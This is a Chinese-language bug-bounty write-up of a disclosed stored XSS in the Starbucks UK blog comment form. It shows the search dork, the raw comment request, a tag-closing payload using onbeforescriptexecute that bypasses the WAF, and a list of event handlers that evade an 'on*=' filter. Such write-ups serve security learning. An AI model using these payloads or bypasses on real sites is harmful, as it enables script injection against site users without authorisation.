# 漏洞散记
## Comment处的XSS
> 这篇漏洞单独不大，主要目的在于搜集，因为作者列出了不少XSS中可以用来bypass的事件，这个很方便

> 漏洞价值:500$

> 源漏洞:[#218226](https://hackerone.com/reports/218226)


# 挖洞过程
`site:www.starbucks.co.uk inurl:blog/`

作者利用google hacking查询到域名下的博客部分，因为作者觉的，这个地方既然发布了文章，就很有可能存在用户交互的地方，也就是评论部分。结果如作者所料：

```
POST /blog/addcomment HTTP/1.1
Host: www.starbucks.co.uk
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html, */*; q=0.01
Accept-Language: en-US,en;q=0.5
X-NewRelic-ID: VQUHVlNSARACV1JSBAIGVA==
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability
Content-Length: 321
Cookie: [redacted]
Connection: close

Body=Nice&ParentId=0&PostID=1241&author=ope67164%40disaq.com
```
`Body`和`author`的值会被带入到新的评论中发布到页面上。作者发现`author`的值没有被完全的编码，因为HTML标签能够被传入其中。

但是网站本身存在waf，当发现参数中携带`<script></script>`或者是匹配到`on*=`时，便会返回500的错误，作者这时候就只能想办法bypass

## Fuzz

```
</li></ul></li></ul></div></div></div></div><test/onbeforescriptexecute=confirm`h1poc`>
```
作者尝试跳过大部分的标签，并且使用`onbeforescriptexecute`作为事件使用，最终上面的payload可以执行

作者还经过测试，查看哪些能够bypass`on*=`

```
onsearch
onwebkitanimationiteration
onwebkitanimationstart
onanimationiteration
onwebkitanimationend
onanimationstart
ondataavailable
ontransitionend
onanimationend
onreceived
onpopstate
```
## 结论
其实本次的漏洞并不是很难，但是真正值得注意的部分是一个漏洞猎人如何去挖掘与bypass，明白`on*=`只要代码没有写成绝对的禁止，那必然有绕过的方式
